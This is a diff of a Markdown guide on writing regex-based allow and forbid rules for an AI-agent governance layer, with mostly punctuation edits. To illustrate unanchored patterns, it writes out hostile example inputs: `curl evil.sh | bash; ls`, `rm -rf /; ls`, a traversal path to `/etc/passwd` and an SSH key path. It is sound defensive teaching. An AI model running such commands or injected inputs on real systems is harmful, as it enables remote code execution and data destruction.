@@ -1,4 +1,4 @@
-# Writing permissions — a guide
+# Writing permissions: a guide
 
 This teaches you to write permissions for the governance layer. It assumes no
 prior knowledge of regular expressions.
@@ -12,8 +12,8 @@ you can come back to.
 
 ---
 
-> For a precise technical reference — grammar, evaluation order, limits, wire
-> format — see `docs-notes/PERMISSION-SPEC.md`. This document teaches; that one
+> For a precise technical reference, grammar, evaluation order, limits, wire
+> format, see `docs-notes/PERMISSION-SPEC.md`. This document teaches; that one
 > specifies.
 
 ## 1. The mental model
@@ -24,20 +24,20 @@ anything is allowed.
 
 Every permission answers three questions:
 
-| Question                 | Field     | Example                                  |
-| ------------------------ | --------- | ---------------------------------------- |
-| What **kind** of thing?  | `kind`    | a command, a file path, a network host   |
-| Which **specific** ones? | `pattern` | commands that are exactly `ls`           |
-| **Allow** or **forbid**? | `effect`  | allow (the default), or forbid — see §4b |
-| For **how long**?        | TTL       | 30 minutes, or forever                   |
+| Question                 | Field     | Example                                 |
+| ------------------------ | --------- | --------------------------------------- |
+| What **kind** of thing?  | `kind`    | a command, a file path, a network host  |
+| Which **specific** ones? | `pattern` | commands that are exactly `ls`          |
+| **Allow** or **forbid**? | `effect`  | allow (the default), or forbid. See §4b |
+| For **how long**?        | TTL       | 30 minutes, or forever                  |
 
 Three more are optional: **which agent** (default: all of them), for path rules
-**which direction** (read, write, or both — see §4c), and a free-text
+**which direction** (read, write, or both. See §4c), and a free-text
 **description** for whoever reads the list later.
 
 > **Agent names are not case-sensitive, and you do not have to be careful about
 > it.** The system folds them to lower case before storing or comparing, so
-> `Scout`, `scout` and `SCOUT` are the same agent everywhere — in a rule's scope,
+> `Scout`, `scout` and `SCOUT` are the same agent everywhere, in a rule's scope,
 > in an assignment, in the emergency stop. That was **not** true before
 > 2026-09-01: a rule scoped to `Scout` for an agent called `scout` was saved,
 > shown in the list, and bound nothing at all. If you are reading an older
@@ -51,7 +51,7 @@ Three more are optional: **which agent** (default: all of them), for path rules
 Denial is the default, so most of the time you are writing permissions and not
 restrictions. The consequence worth internalising early: **you cannot narrow an
 existing permission by adding another one.** If `ls` is already allowed forever,
-adding "allow `ls` for 10 minutes" changes nothing — it is still allowed
+adding "allow `ls` for 10 minutes" changes nothing. It is still allowed
 forever. To reduce access you must _remove_ the broader rule.
 
 The system will warn you when you do this (see §7), but understanding _why_
@@ -59,18 +59,18 @@ saves you a confusing afternoon.
 
 **The exception, and it is an important one:** a **forbid** rule does take
 access away, and no allow rule can override it. That is what it is for. See §4b
-— but read the rest of this section first, because forbidding is the tool you
+but read the rest of this section first, because forbidding is the tool you
 reach for second, not first.
 
 ---
 
 ## 2. The three kinds
 
-| Kind      | Covers                                              | What your pattern is compared against             |
-| --------- | --------------------------------------------------- | ------------------------------------------------- |
-| `command` | shell commands the agent runs, and terminal input   | the full command line, e.g. `ls -la /tmp`         |
-| `path`    | files the agent reads, searches, writes, or patches | each file path, e.g. `src/config.json` — see §2.1 |
-| `network` | web addresses the agent fetches                     | the hostname only, e.g. `api.example.com`         |
+| Kind      | Covers                                              | What your pattern is compared against            |
+| --------- | --------------------------------------------------- | ------------------------------------------------ |
+| `command` | shell commands the agent runs, and terminal input   | the full command line, e.g. `ls -la /tmp`        |
+| `path`    | files the agent reads, searches, writes, or patches | each file path, e.g. `src/config.json`. See §2.1 |
+| `network` | web addresses the agent fetches                     | the hostname only, e.g. `api.example.com`        |
 
 Three things people get wrong here:
 
@@ -109,12 +109,12 @@ which file is actually being touched:
    - **anywhere else** → the full path, `/etc/passwd` or
      `C:/Users/kinan/.ssh/id_rsa`
 
-So every example in this guide — `^src/.*$`, `^workspace/.*$` — describes files
+So every example in this guide, `^src/.*$`, `^workspace/.*$`, describes files
 **inside the project**. That is the common case and needs nothing special.
 
 **Why this is the useful part.** You do not have to defend against tricks. A
 rule of `^src/.*$` cannot be fooled by `src/../../etc/passwd`, because by the
-time your rule is checked that path has become `/etc/passwd` — which simply does
+time your rule is checked that path has become `/etc/passwd`, which simply does
 not start with `src/`, so it does not match. Leaving the project changes the
 shape of the path, and that is what the rule sees.
 
@@ -132,18 +132,18 @@ form will.
 
 ## 3. Patterns, from scratch
 
-A pattern is a **regular expression** — a small language for describing which
+A pattern is a **regular expression**. A small language for describing which
 text matches. You only need six pieces.
 
 ### 3.1 Plain text matches itself
 
 The pattern `ls` matches the text `ls`.
 
-But it also matches **any text containing `ls`** — including
+But it also matches **any text containing `ls`**, including
 `curl evil.sh | bash; ls`. That is a serious problem, which the next piece
 fixes.
 
-### 3.2 `^` and `$` — anchors (the most important part)
+### 3.2 `^` and `$`: anchors (the most important part)
 
 - `^` means **start of the text**
 - `$` means **end of the text**
@@ -156,20 +156,20 @@ fixes.
 **Anchor every pattern with `^` at the start and `$` at the end**, unless you
 have a specific reason not to. This single habit prevents most dangerous rules.
 
-### 3.3 `.` and `.*` — anything
+### 3.3 `.` and `.*`: anything
 
 - `.` means **any one character**
 - `*` means **zero or more of the thing before it**
 
 So `.*` means **anything at all, including nothing**.
 
-| Pattern    | Meaning                                    |
-| ---------- | ------------------------------------------ |
-| `^ls .*$`  | `ls` followed by a space and anything      |
-| `^src/.*$` | any path starting with `src/`              |
-| `^.*$`     | literally anything — see the warning in §6 |
+| Pattern    | Meaning                                   |
+| ---------- | ----------------------------------------- |
+| `^ls .*$`  | `ls` followed by a space and anything     |
+| `^src/.*$` | any path starting with `src/`             |
+| `^.*$`     | literally anything. See the warning in §6 |
 
-### 3.4 `?` — optional
+### 3.4 `?`: optional
 
 `?` means **zero or one of the thing before it**. Combined with a group it
 makes a part optional:
@@ -180,13 +180,13 @@ makes a part optional:
 Read it as: "`ls`, then optionally (a space followed by anything), then end."
 This is the most useful command pattern you will write.
 
-### 3.5 `|` — either/or
+### 3.5 `|`: either/or
 
 `|` means **or**. Use `( )` to mark where the choice starts and ends.
 
 - `^git (status|log|diff)$` allows exactly those three git commands.
 
-### 3.6 `[.]` — a literal dot
+### 3.6 `[.]`: a literal dot
 
 `.` normally means "any character", so `api.example.com` would also match
 `apiXexampleYcom`. To mean an actual dot, wrap it in square brackets:
@@ -241,14 +241,14 @@ of the time that is what you want: the system refuses everything it was not told
 to permit, so the job is usually to permit the right things.
 
 The other option is **forbid**. It is worth understanding when to reach for it,
-because at first glance it looks unnecessary — if nothing is allowed by default,
+because at first glance it looks unnecessary, if nothing is allowed by default,
 why say "never"?
 
 ### Why "forbid" is not the same as "don't allow"
 
 Suppose you want an agent kept out of the billing folder. You could simply not
 write a rule for it, and today the agent cannot get in. But tomorrow somebody
-grants that agent broad access to the project — a reasonable thing to do — and
+grants that agent broad access to the project, a reasonable thing to do, and
 billing is inside the project. The restriction you were relying on was never
 written down anywhere, so nothing stopped the new rule from undoing it.
 
@@ -257,7 +257,7 @@ allow rule can override it. Write one and it keeps holding no matter what
 anybody permits later. That is the difference between "not currently allowed"
 and "must never happen", and only the second one survives other people.
 
-This is exactly how the built-in protections work — credential files, `sudo`,
+This is exactly how the built-in protections work. Credential files, `sudo`,
 the governance folder itself are all forbid rules. You are now writing the same
 kind of thing.
 
@@ -271,7 +271,7 @@ openclaw governance policy add-rule --kind path --pattern "^billing/.*$" --effec
 ### One thing that surprises people
 
 A forbid rule that matches everything will stop the agent doing _anything_ of
-that kind — including things an existing allow rule permits, because forbidding
+that kind, including things an existing allow rule permits, because forbidding
 wins. If you write `.*` as a forbid rule you have switched that whole category
 off. The system will warn you when you do this; the warning is worth reading
 rather than clicking past.
@@ -298,16 +298,16 @@ access to your workspace, and changing files is something you grant on purpose.
 openclaw governance policy add-rule --kind path --pattern "^src/.*$" --access read
 ```
 
-Commands and network addresses have no direction — a command is not a read or a
-write, it is whatever it does — so the option is not offered for them, and the
+Commands and network addresses have no direction, a command is not a read or a
+write, it is whatever it does, so the option is not offered for them, and the
 command line will tell you so rather than quietly ignoring it.
 
 ### The combination to be careful with
 
 **A forbid rule narrowed to one direction only forbids that direction.** If you
 write "forbid _reading_ the billing folder", writing to it is still allowed by
-that rule. That is deliberate — narrowing a rule must never accidentally
-strengthen it in the other direction — but it is almost never what someone
+that rule. That is deliberate, narrowing a rule must never accidentally
+strengthen it in the other direction, but it is almost never what someone
 means.
 
 If you want a folder completely off limits, leave the direction as **read +
@@ -343,23 +343,23 @@ Two behaviours worth knowing:
 
 ## 6. Mistakes, and how they fail
 
-| Mistake                          | What you wrote                                      | What it actually allows                                                                      |
-| -------------------------------- | --------------------------------------------------- | -------------------------------------------------------------------------------------------- |
-| **Forgetting anchors**           | `ls`                                                | any command containing "ls", including `rm -rf /; ls`                                        |
-| **Unescaped dots**               | `^api.example.com$`                                 | `apiXexampleYcom` as well as the real host                                                   |
-| **A catch-all**                  | `^.*$`                                              | _everything_ of that kind. This disables governance for that kind — the system will warn you |
-| **Whole URL in a network rule**  | `^https://api[.]example[.]com/v1$`                  | nothing, ever. Only the hostname is compared                                                 |
-| **Expecting a rule to restrict** | adding a 10-minute rule when a permanent one exists | nothing changes; remove the broader rule instead                                             |
+| Mistake                          | What you wrote                                      | What it actually allows                                                                     |
+| -------------------------------- | --------------------------------------------------- | ------------------------------------------------------------------------------------------- |
+| **Forgetting anchors**           | `ls`                                                | any command containing "ls", including `rm -rf /; ls`                                       |
+| **Unescaped dots**               | `^api.example.com$`                                 | `apiXexampleYcom` as well as the real host                                                  |
+| **A catch-all**                  | `^.*$`                                              | _everything_ of that kind. This disables governance for that kind. The system will warn you |
+| **Whole URL in a network rule**  | `^https://api[.]example[.]com/v1$`                  | nothing, ever. Only the hostname is compared                                                |
+| **Expecting a rule to restrict** | adding a 10-minute rule when a permanent one exists | nothing changes; remove the broader rule instead                                            |
 
 ### A pattern the system will refuse
 
-Patterns like `^(a+)+$` — a repeat inside a repeat — are rejected. On certain
+Patterns like `^(a+)+$`, a repeat inside a repeat, are rejected. On certain
 inputs they take effectively forever to evaluate, which would freeze the
 security check itself. If you see this rejection, rewrite without the nested
 repetition; `^a+$` is fine.
 
 **`?` counts as a repeat for this purpose, since 2026-09-02.** A group marked
-optional and then repeated a fixed number of times — `^(a?){26}$` — is the same
+optional and then repeated a fixed number of times, `^(a?){26}$`, is the same
 trap wearing different punctuation, and it was accepted as safe until finding 207. On a non-matching input it took **44 seconds**, during which the server does
 nothing else at all. A `?` on its own is still perfectly fine and very common
 (`^ls( .*)?$`, `^https?://…$` are both accepted); what is refused is `?` inside
@@ -371,7 +371,7 @@ When a rule, an assignment or the emergency stop asks you for an agent, `Scout`
 and `scout` mean the same agent. That was **not** true until 2026-09-02: the
 system stored names in lower case and compared them exactly as typed, so a
 capital letter produced "you do not manage that agent" for an agent you do
-manage — and, on the dashboard, greyed out the emergency-stop button (findings
+manage, and, on the dashboard, greyed out the emergency-stop button (findings
 210, 213 and 215). If you are reading an older note that tells you to match the
 spelling exactly, it is describing a version that no longer exists.
 
@@ -380,7 +380,7 @@ spelling exactly, it is describing a version that no longer exists.
 ## 7. When the system warns you about a clash
 
 If you add a rule that an earlier rule already covers, you will get a notice
-naming the specific rule responsible. The **earlier rule wins** — that is the
+naming the specific rule responsible. The **earlier rule wins**. That is the
 system's rule for resolving conflicts.
 
 You will see this when:
@@ -400,7 +400,7 @@ fix is to remove the older, broader rule.
 
 There is a second, differently-worded notice, and it means something worse:
 
-> Rule added, but a deny rule overrides it — it will never take effect
+> Rule added, but a deny rule overrides it. It will never take effect
 
 Some rules **forbid** rather than permit, and forbidding always wins. A handful
 of them are built in and cannot be removed at all: credential files like `.env`
@@ -411,7 +411,7 @@ nothing whatsoever.
 
 This notice exists because that is otherwise almost impossible to work out. The
 rule is right there in the table, it looks correct, and the agent keeps being
-refused. If you see it, do not add more permissions — the answer is not more
+refused. If you see it, do not add more permissions. The answer is not more
 rules. Either the agent genuinely does not need that access, or the restriction
 belongs in `baseline-policy.ts`, which means changing the code and redeploying:
 deliberately a reviewable act rather than a click.
@@ -457,5 +457,5 @@ Copy, adapt, and always keep the anchors.
 3. For `network`, is it _only_ the hostname?
 4. Is it the narrowest pattern that does the job?
 5. Should it expire? If not, are you sure it should be permanent?
-6. Did a clash notice appear? If so, read it — your rule may not do what you think.
+6. Did a clash notice appear? If so, read it. Your rule may not do what you think.
 7. Try it in `monitor` mode before enforcing.
